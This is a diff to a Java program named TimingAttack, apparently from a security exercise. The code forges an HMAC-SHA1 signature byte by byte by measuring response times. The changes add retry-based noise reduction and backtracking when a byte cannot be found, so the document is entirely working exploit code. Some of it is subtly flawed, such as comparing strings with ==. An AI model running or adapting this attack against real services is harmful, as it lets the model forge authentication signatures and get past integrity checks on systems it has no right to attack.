@@ -17,12 +17,12 @@ public class TimingAttack {
     long maxTime = 0;
     long sumMaxTime = 0;
 		long sumTime = 0;
-    long startTime, endTime, f;
+    long startTime, endTime, f, p;
     String signature = "0".repeat(38);
     byte x = 0;
 
     for (int count = 0; count < MAX_COUNT; count++) {
-      for (int i = 0; i < 255; i++) {
+      for (int i = 0; i < 256; i++) {
         System.out.println(Hex.hexEncoder(x));
         signature = Hex.hexEncoder(x) + signature;
         // time request
@@ -31,11 +31,22 @@ public class TimingAttack {
         endTime = System.currentTimeMillis();
         // get process time
         f = endTime - startTime;
-  
         System.out.println("Time: " + f);
 				sumTime += f;
         maxTime = Math.max(maxTime, f);
-  
+        if (maxTime == f) {
+          p = f;
+          for (int j = 0; j < RETRY_COUNT; j++) {
+            // time request
+            startTime = System.currentTimeMillis();
+            sendRequest(signature);
+            endTime = System.currentTimeMillis();
+            // get process time
+            f = endTime - startTime;
+            p = Math.min(p, f);
+          }
+          maxTime = Math.max(p, maxTime);
+        }
         x++;
       }
 	
@@ -93,11 +104,11 @@ public class TimingAttack {
 		return successCount == RETRY_COUNT;
 	}
 	
-  public static String attack(String signature, int bytesID) throws IOException {
+  public static String attack(String signature, int bytesID, int start) throws IOException {
     String g;
     long startTime, endTime, f, c;
-    byte x = 0;
-    for (int i = 0; i < 255; i++) {
+    byte x = (byte) start;
+    for (int i = start; i < 256; i++) {
       g = signature + Hex.hexEncoder(x);
       g += "0".repeat(40 - g.length()); // Padding with gibbersih
       System.out.println("Sent signature: " + g);
@@ -127,6 +138,7 @@ public class TimingAttack {
     // HMAC using SHA-1
     // Therefore there are 20 bytes to check = 40 Hex character
     /* if false then time is small, else there are delay */
+		int skipBytes = 0;
 		System.out.println("INIT");
 		init();
 		System.out.println("INIT Finished");
@@ -141,12 +153,28 @@ public class TimingAttack {
     String f;
     for (int i = (signature.length() / 2) + 1; i <= 20; i++) {
 			System.out.println("BytesID: " + i);
-			f = attack(signature, i);
+			f = attack(signature, i, 0);
 			
-			if (f == "") {
+			while (f == "") {
 				System.out.println("Error: Can't find bytes");
-				if (signature.length() > 0) System.out.println("Try to run from: " + signature.substring(0, signature.length() - 2));
-				System.exit(-1);
+				if (skipBytes == 255 || signature.length() == 0) {
+					System.out.println("Failed");
+					System.exit(-1);
+				}
+				// rebuilding from prev state
+				skipBytes = Integer.parseInt(signature.substring(signature.length() - 2), 16);
+				signature = signature.substring(0, signature.length() - 2);
+				System.out.println("Trying to build from " + signature);
+				f = attack(signature, i - 1, skipBytes + 1);
+				
+				if (f == "") {
+					System.out.println("Failed rebuilding!");
+					System.exit(-1);
+				}
+				
+				// trying to find correct bytes again
+				signature += f;
+				f = attack(signature, i, 0);
 			}
 			
 			System.out.println("Correct bytes: " + f);
